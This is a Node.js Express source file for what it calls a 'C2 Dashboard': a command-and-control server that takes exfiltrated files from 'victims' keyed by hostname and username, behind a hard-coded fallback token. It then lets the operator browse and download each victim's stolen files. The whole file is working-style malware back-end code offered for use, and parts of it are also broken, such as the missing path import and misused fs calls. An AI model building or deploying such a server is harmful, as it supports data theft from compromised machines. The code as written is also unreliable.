const fs = require('fs');
const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Determine folder path (Railway or local)
let VICTIMS_DIR;
if (process.env.RAILWAY_URL) {
    VICTIMS_DIR = '/tmp/victims';
} else {
    VICTIMS_DIR = './victims';
}

// Read secret from environment or fallback for local
const SECRET_TOKEN = process.env.SECRET_TOKEN || 'qutmess';

// Ensure victims folder exists
(async () => {
    try {
        if (!fs.existsSync(VICTIMS_DIR)) {
            fs.mkdirSync(VICTIMS_DIR);
        }
        console.log(`Victims folder ready at ${VICTIMS_DIR}`);
    } catch (err) {
        console.error('Failed to create victims folder:', err);
        process.exit(1);
    }
})();

// Root dashboard
app.get('/', async (req, res) => {
    try {
        const victims = await fs.readdir(VICTIMS_DIR);
        res.send(`<h2>C2 Dashboard — ${victims.length} victims</h2><ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join('')}</ul>`);
    } catch (err) {
        console.error('Failed to read victims folder:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Receive exfiltrated file
app.post('/send', async (req, res) => {
    try {
        const { hostname, username, token, file } = req.body;
        if (token !== SECRET_TOKEN) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        if (!file) {
            return res.status(400).json({ error: 'No file provided' });
        }

        const safeFolder = path.basename(`${hostname}_${username}`);
        const victimDir = `${VICTIMS_DIR}/${safeFolder}`;
        const filePath = `${victimDir}/${path.basename(file)}`;

        try {
            await fs.mkdirSync(victimDir, { recursive: true });
            await fs.copyFileSync(file.path, filePath);
            console.log(`[+] ${safeFolder} — saved ${path.basename(file)}`);
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to save file:', err);
            res.status(500).json({ error: 'Write failed' });
        }
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Browse victim files (recursive)
app.get(/^\/victim\/([^\/]+)\/(.+)/, async (req, res) => {
    try {
        const safeId = req.params[0];
        const victimDir = `${VICTIMS_DIR}/${safeId}`;
        const subPath = req.params[1];
        const fullPath = `${victimDir}/${subPath}`;

        // Check if it's a directory
        try {
            const stats = await fs.stat(fullPath);
            if (stats.isDirectory()) {
                const files = await fs.readdir(fullPath);
                const backLink = subPath ? `/victim/${safeId}/${path.dirname(subPath).replace(/\\/g, '/')}` : `/victim/${safeId}`;
                res.send(`<h2>Folder: ${subPath || safeId}</h2><a href="${backLink}">⬅ Back</a><ul>${files.map(f => {
                    const itemPath = subPath ? `${subPath}/${f}` : f;
                    const itemFullPath = `${fullPath}/${f}`;
                    const isDir = fs.statSync(itemFullPath).isDirectory();
                    return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, '/')}${isDir ? '/' : ''}">${f}</a></li>`;
                }).join('')}</ul>`);
                return;
            }
        } catch (err) {}

        // It's a file - download it
        res.download(fullPath);
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Browse victim root
app.get('/victim/:id', async (req, res) => {
    try {
        const safeId = req.params.id;
        const victimDir = `${VICTIMS_DIR}/${safeId}`;

        let files;
        try {
            files = await fs.readdir(victimDir);
        } catch (err) {
            console.error('Failed to read victim folder:', err);
            return res.status(404).send('Not found');
        }

        res.send(`<h2>Victim: ${safeId}</h2><ul>${files.map(f => `<li><a href="/victim/${safeId}/${f.replace(/\\/g, '/')}"">${f}</a></li>`).join('')}</ul>`);
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));
